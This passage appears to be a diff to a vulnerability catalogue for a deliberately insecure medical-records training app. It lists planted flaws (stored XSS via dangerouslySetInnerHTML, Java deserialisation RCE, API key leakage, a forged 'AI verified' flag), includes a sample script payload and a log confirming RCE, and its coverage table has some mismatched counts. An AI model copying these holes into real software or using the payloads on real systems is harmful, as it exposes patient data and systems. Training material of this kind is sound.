+**250. [A08] `POST /api/doctor/ai/summarize-record` stores LLM response as `aiVerified=true` MedicalRecord — `DoctorAIService.java#summarizeRecord`**
+```java
+MedicalRecord rec = MedicalRecord.builder()
+        .patient(patient)
+        .doctor(doctor)
+        .diagnosis(summary)   // LLM response — caller-controlled if modelUrl points at attacker
+        .prescription("AI-generated summary; provenance: " + modelUrl)
+        .aiVerified(Boolean.TRUE)
+        .aiModelUrl(modelUrl)
+        ...
+        .build();
+medicalRecordRepository.save(rec);
+```
+No signature verification, no human review gate, no two-doctor sign-off. The `aiVerified` ribbon on `DoctorPatientChartPage` renders the row with a green check — clinicians see "AI verified" badging on text that was literally returned by an attacker's HTTP server. Integrity loss is invisible.
+
+Live demo: `summarize-record` with `modelUrl=http://localhost:9876/v1/chat` (test stub returning HTML 501) saved MedicalRecord #8 with the 501 HTML in `diagnosis`.
+
+---
+
+**251. [A05] `AIAssistantPanel.tsx` renders LLM response with `dangerouslySetInnerHTML` — `components/doctor/AIAssistantPanel.tsx` (frontend)**
+```tsx
+<div className="..."
+     dangerouslySetInnerHTML={{ __html: result.response ?? '' }} />
+```
+Attacker controls `modelUrl` and returns `<script>fetch('/api/admin/users/1/impersonate',{method:'POST'})...</script>`. Doctor's session executes the script. Compounds #249 (SSRF) into stored XSS on the doctor's own browser.
+
+---
+
+**252. [A05] `ReferralBundleViewer.tsx` renders bundle summary as HTML — `components/doctor/ReferralBundleViewer.tsx` (frontend)**
+```tsx
+<div className="..."
+     dangerouslySetInnerHTML={{ __html: referral.previewSummary }} />
+```
+`previewSummary` comes from the deserialised `ReferralBundle.summary` field — attacker-controlled. Any doctor opening the Referrals page runs the payload. Compounds #245 — the RCE primitive fires on the JVM, and the XSS primitive fires on every doctor's browser, from the same POST.
+
+---
+
+**253. [A09] No audit on deserialisation, accept, suggest, summarize-record — `DoctorReferralService.java` + `DoctorAIService.java`**
+No `auditLogRepository.save(...)` on any Module F mutation. RCE attempts (successful or not) leave no semantic record. The `LoggingInterceptor` catches the HTTP request but not "ReferralBundle.cmd = touch /tmp/owned" — that string only exists inside the binary serialised blob.
+
+---
+
+**254. [A10] Failed deserialisation silently returns null — `DoctorReferralService.java#decodeBundle`**
+```java
+} catch (Exception e) {
+    // [A10] Silent — decode failures stored only as `decodeStatus`.
+}
+return null;
+```
+Any malformed payload, wrong class, ClassNotFoundException, etc. returns null and the row's `decodeStatus` field shows `decode-failed`. The exception details — useful for an attacker probing what classes the server has — never surface. Useful for the attacker because their *successful* RCE payloads also leave the response looking "normal" (200 OK, just decode-failed for the malicious row).
+
+---
+
+**255. [A02] AI gateway key sent on every outbound POST even to caller-controlled URLs — `DoctorAIService.java#postJsonAndReadResponse`**
+Already noted in #249, listed separately because it is a distinct misconfiguration: there is no per-host conditional that strips the `Authorization` header when the URL is not the configured gateway. The misconfig sits in the *helper*, so it leaks the key on both `/suggest` and `/summarize-record` flows.
+
+---
+
+### Phase 6 Bug-Check Pass (per `DOCTOR_VIEW_PLAN.md` §7.1)
+
+- Backend `./mvnw test` → `Tests run: 1, Failures: 0, Errors: 0` (context loads with two new controllers, two new services, new entity / repo / DTOs, plus the V24 migration applied on DB at V23).
+- Backend smoke (curl against running `localhost:8085`):
+  - `GET /doctor/ai/model-info` → API key returned in clear.
+  - `POST /doctor/ai/suggest` with `modelUrl=http://localhost:9876/...` → outboundPayload contained full PHI; response captured from the stub.
+  - `POST /doctor/ai/summarize-record` → saved MedicalRecord #8 with `aiVerified=true` and `aiModelUrl=...`.
+  - Built a malicious `ReferralBundle` (cmd=`touch /tmp/PHASE6-RCE-PWN`), base64-encoded, posted via `POST /doctor/referrals`, then `GET /doctor/referrals/inbox` → file `/tmp/PHASE6-RCE-PWN` appeared on disk. **Deserialisation RCE confirmed end-to-end.**
+- Frontend `npx tsc -b --noEmit` → exit 0.
+- Frontend `npx eslint` (touched files only) → 0 errors, 0 warnings.
+- Cross-repo regression: 17 endpoints (8 existing + 9 doctor modules across 6 phases) all 200.
+
+---
+
+## Doctor View Redesign — Final Coverage Summary
+
+After 6 phases the **49 new doctor-module vulnerabilities (#191–#255)** map onto the OWASP Top 10:2025 categories as follows:
+
+| OWASP 2025 | Module B/C/D/E/F additions | Total in repo after Phase 6 |
+|---|---|---|
+| A01 Broken Access Control | 1 (191), 2 (192/193) | small bump on top of 101 |
+| **A02 Security Misconfiguration** | +9 (217, 219, 221, 226, 234, 236, 237, 238, 243, 244, 247, 255) | **was 19 → now 31** |
+| **A03 Software Supply Chain** | +12 (204, 205, 206, 212, 213, 214, 220, 224, 228, 229, 235, 240, 249) | **was 19 → now 31** |
+| A04 Cryptographic Failures | +3 (217, 226, 248) | bump on top of 48 |
+| A05 Injection | +7 (199, 207, 215, 218, 251, 252, …) | bump on top of 42 |
+| A06 Insecure Design | +3 (193, 195, 196, 202) | bump on top of 35 |
+| A07 Authentication Failures | +2 (210 partial, 231) | small bump on top of 46 |
+| **A08 Software/Data Integrity** | +12 (200, 208, 210, 216, 225, 227, 230, 245, 246, 250, 253) | **was 19 → now 31** |
+| A09 Logging Failures | +7 (198, 201, 203, 209, 222, 242, 253) | bump on top of 23 |
+| A10 Exceptional Conditions | +4 (211, 223, 233, 254) | bump on top of 36 |
+
+The three least-covered categories at session start (A02, A03, A08 — all 19) each gained roughly +10–12 demos and now sit alongside A04 / A07 in the second tier. The "fun" demos — Freemarker SSTI, XXE, Nashorn RCE, plaintext token in URL, public PHI iCal feed, Java deserialisation RCE — cover every flavour of cross-cutting weakness the OWASP 2025 list is built around.
+
+---
+
 
 
 > Rows are ordered to match the **OWASP Top 10:2025** list. Where the old project labels merged
